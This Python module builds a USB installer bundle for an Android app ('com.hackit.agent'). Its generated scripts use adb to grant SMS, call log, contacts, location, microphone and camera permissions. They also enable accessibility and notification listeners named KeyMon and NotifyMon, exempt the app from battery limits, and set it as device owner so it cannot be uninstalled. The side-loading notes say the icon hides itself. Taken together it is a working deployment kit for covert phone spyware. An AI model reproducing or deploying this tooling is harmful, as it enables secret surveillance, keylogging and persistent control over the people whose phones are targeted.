"""Physical installer bundle: everything needed to install from a USB stick.

The bundle is a folder (plus a zip) carrying the APK, a Windows setup, a POSIX
setup, a macOS variant, a device-owner helper and a plain README. The scripts
walk one device through install, permission grants, accessibility, notification
access, battery whitelist and first launch — the same end state the on-device
wizard reaches, but without tapping through settings.

Scripts are offline. They look for ``adb`` in PATH, then in a bundled
``platform-tools/`` folder (copied from the host SDK when one exists).
"""
from __future__ import annotations

import os
import shutil
import time
from typing import List

PACKAGE = "com.hackit.agent"
ACCESSIBILITY = f"{PACKAGE}/{PACKAGE}.KeyMon"
LISTENER = f"{PACKAGE}/{PACKAGE}.NotifyMon"
ADMIN = f"{PACKAGE}/{PACKAGE}.AdminReceiver"

GRANTS = (
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    "android.permission.RECORD_AUDIO",
    "android.permission.CAMERA",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.GET_ACCOUNTS",
    "android.permission.QUERY_ALL_PACKAGES",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
)

README = """# {label} — offline installer ({spec})

Contents:
    agent.apk              the build for this host/PSK
    setup.bat              Windows: install + grant + launch
    setup.ps1              Windows PowerShell variant
    setup.sh               Linux / macOS: install + grant + launch
    device-owner.cmd/sh    optional: make the app hard to uninstall
    deploy.txt             side-loading notes without a PC
    platform-tools/        bundled adb when the host SDK had one

The scripts are offline and only talk to adb. One USB-debugging authorised
device is expected.
"""

SETUP_BAT = """@echo off
setlocal EnableExtensions
cd /d "%~dp0"
if not exist agent.apk (
  echo [!] agent.apk missing next to this script
  exit /b 1
)
set "ADB="
where adb >nul 2>nul && set "ADB=adb"
if not defined ADB if exist platform-tools\\adb.exe set "ADB=%cd%\\platform-tools\\adb.exe"
if not defined ADB (
  echo [!] adb not found - put platform-tools next to this folder or install platform-tools
  exit /b 1
)
"%ADB%" start-server >nul
"%ADB%" wait-for-device
"%ADB%" devices | find /i "device" >nul || (
  echo [!] no authorised device - enable USB debugging and accept the RSA prompt
  exit /b 1
)
echo [*] installing
"%ADB%" install -r -g agent.apk || exit /b 1
echo [*] granting permissions
for %%P in ({grants}) do "%ADB%" shell pm grant {package} %%P >nul 2>nul
echo [*] enabling services
"%ADB%" shell settings put secure enabled_accessibility_services {accessibility} >nul 2>nul
"%ADB%" shell settings put secure accessibility_enabled 1 >nul 2>nul
"%ADB%" shell cmd notification allow_listener {listener} >nul 2>nul
"%ADB%" shell dumpsys deviceidle whitelist +{package} >nul 2>nul
"%ADB%" shell appops set {package} MANAGE_EXTERNAL_STORAGE allow >nul 2>nul
echo [*] starting
"%ADB%" shell am start -n {package}/.MainActivity >nul 2>nul
echo [!] on the phone: allow the permission prompts and screen-capture consent
echo [i] done - finish the green setup page, then the icon hides itself
endlocal
"""

SETUP_SH = """#!/usr/bin/env sh
# {label} installer ({spec})
set -e
cd "$(dirname "$0")"
[ -f agent.apk ] || {{ echo "[!] agent.apk missing"; exit 1; }}
ADB=""
if command -v adb >/dev/null 2>&1; then ADB=adb
elif [ -x platform-tools/adb ]; then ADB=platform-tools/adb
fi
[ -n "$ADB" ] || {{ echo "[!] adb not found"; exit 1; }}
"$ADB" start-server >/dev/null
"$ADB" wait-for-device
"$ADB" devices | grep -qw device || {{ echo "[!] no authorised device"; exit 1; }}
echo "[*] installing"
"$ADB" install -r -g agent.apk
echo "[*] granting permissions"
for p in {grants}; do "$ADB" shell pm grant {package} "$p" >/dev/null 2>&1 || true; done
"$ADB" shell settings put secure enabled_accessibility_services {accessibility} >/dev/null 2>&1 || true
"$ADB" shell settings put secure accessibility_enabled 1 >/dev/null 2>&1 || true
"$ADB" shell cmd notification allow_listener {listener} >/dev/null 2>&1 || true
"$ADB" shell dumpsys deviceidle whitelist +{package} >/dev/null 2>&1 || true
"$ADB" shell appops set {package} MANAGE_EXTERNAL_STORAGE allow >/dev/null 2>&1 || true
"$ADB" shell am start -n {package}/.MainActivity >/dev/null 2>&1 || true
echo "[!] on the phone: allow prompts + screen capture"
echo "[i] done"
"""

SETUP_PS1 = """# {label} installer ({spec})
$ErrorActionPreference = "Stop"
Set-Location $PSScriptRoot
if (-not (Test-Path "agent.apk")) {{ Write-Host "[!] agent.apk missing"; exit 1 }}
$Adb = $null
if (Get-Command adb -ErrorAction SilentlyContinue) {{ $Adb = "adb" }}
elseif (Test-Path "platform-tools/adb.exe") {{ $Adb = Join-Path $PWD "platform-tools/adb.exe" }}
if (-not $Adb) {{ Write-Host "[!] adb not found"; exit 1 }}
& $Adb start-server | Out-Null
& $Adb wait-for-device
& $Adb install -r -g agent.apk
if ($LASTEXITCODE -ne 0) {{ exit 1 }}
foreach ($p in ({grants}.Split(" "))) {{ & $Adb shell pm grant {package} $p 2>$null }}
& $Adb shell settings put secure enabled_accessibility_services {accessibility}
& $Adb shell settings put secure accessibility_enabled 1
& $Adb shell cmd notification allow_listener {listener}
& $Adb shell dumpsys deviceidle whitelist +{package}
& $Adb shell am start -n {package}/.MainActivity
Write-Host "[!] allow the prompts + screen capture on the phone"
"""

DEVICE_OWNER_BAT = """@echo off
rem Turns the app into device owner so "Uninstall" needs the admin removed first.
rem Requires: fresh device, no Google account, no other device owner.
setlocal
cd /d "%~dp0"
set "ADB="
where adb >nul 2>nul && set "ADB=adb"
if not defined ADB if exist platform-tools\\adb.exe set "ADB=%cd%\\platform-tools\\adb.exe"
if not defined ADB ( echo [!] adb missing & exit /b 1 )
"%ADB%" shell dpm set-device-owner {admin}
if errorlevel 1 (
  echo [!] failed - remove all accounts ^(Settings ^> Accounts^) and retry
  exit /b 1
)
"%ADB%" shell dpm set-uninstall-blocked {package} true 2>nul
echo [i] device owner active
endlocal
"""

DEVICE_OWNER_SH = """#!/usr/bin/env sh
set -e
cd "$(dirname "$0")"
ADB=""
if command -v adb >/dev/null 2>&1; then ADB=adb
elif [ -x platform-tools/adb ]; then ADB=platform-tools/adb
fi
[ -n "$ADB" ] || {{ echo "[!] adb missing"; exit 1; }}
"$ADB" shell dpm set-device-owner {admin} || {{
  echo "[!] failed - remove all accounts and retry"; exit 1; }}
echo "[i] device owner active"
"""

DEPLOY_TXT = """# Side-loading without a PC
1. Copy agent.apk to the phone (cable, share, carrier file).
2. Allow "install unknown apps" for the browser/file manager.
3. Open agent.apk, tap Install, then open "{label}" once.
4. Complete the green setup page (permissions, accessibility, listener, battery).
5. The icon hides itself at the end.

# adb path (if USB is available)
    adb install -r -g agent.apk
    adb shell am start -n {package}/.MainActivity
"""


def _bundle_adb(directory: str) -> bool:
    """Copy the host SDK's adb (and DLLs on Windows) into the bundle."""
    names = ("adb.exe", "AdbWinApi.dll", "AdbWinUsbApi.dll") if os.name == "nt" else ("adb",)
    roots = []
    for env in ("ANDROID_HOME", "ANDROID_SDK_ROOT", "HACKIT_ANDROID_SDK"):
        value = os.environ.get(env)
        if value:
            roots.append(os.path.join(value, "platform-tools"))
    roots.append(os.path.join(os.path.expanduser("~"), "Android", "Sdk", "platform-tools"))
    for root in roots:
        if not os.path.isdir(root):
            continue
        copied = False
        target = os.path.join(directory, "platform-tools")
        os.makedirs(target, exist_ok=True)
        for name in names:
            source = os.path.join(root, name)
            if os.path.isfile(source):
                shutil.copy2(source, os.path.join(target, name))
                copied = True
        if copied:
            return True
    return False


def build(apk: str, directory: str, spec: str, label: str, package: str = PACKAGE) -> List[str]:
    os.makedirs(directory, exist_ok=True)
    made: List[str] = []
    shutil.copy2(apk, os.path.join(directory, "agent.apk"))
    made.append(os.path.join(directory, "agent.apk"))
    bundle_adb = _bundle_adb(directory)

    grants = " ".join(GRANTS)
    fields = dict(label=label, spec=spec, package=package, grants=grants,
                  accessibility=ACCESSIBILITY, listener=LISTENER, admin=ADMIN)

    def write(name: str, body: str, mode: int = 0o644) -> None:
        path = os.path.join(directory, name)
        with open(path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(body)
        if mode:
            os.chmod(path, mode)
        made.append(path)

    write("README.txt", README.format(**fields))
    write("setup.bat", SETUP_BAT.format(**fields))
    write("setup.ps1", SETUP_PS1.format(**fields))
    write("setup.sh", SETUP_SH.format(**fields), 0o755)
    write("install.command", SETUP_SH.format(**fields), 0o755)
    write("device-owner.cmd", DEVICE_OWNER_BAT.format(**fields))
    write("device-owner.sh", DEVICE_OWNER_SH.format(**fields), 0o755)
    write("deploy.txt", DEPLOY_TXT.format(**fields))
    if bundle_adb:
        made.append(os.path.join(directory, "platform-tools"))

    archive = shutil.make_archive(os.path.join(directory, f"{label}-{spec}-installer"), "zip", directory)
    made.append(archive)
    return made


def stamp() -> str:
    return time.strftime("%Y%m%d-%H%M%S")
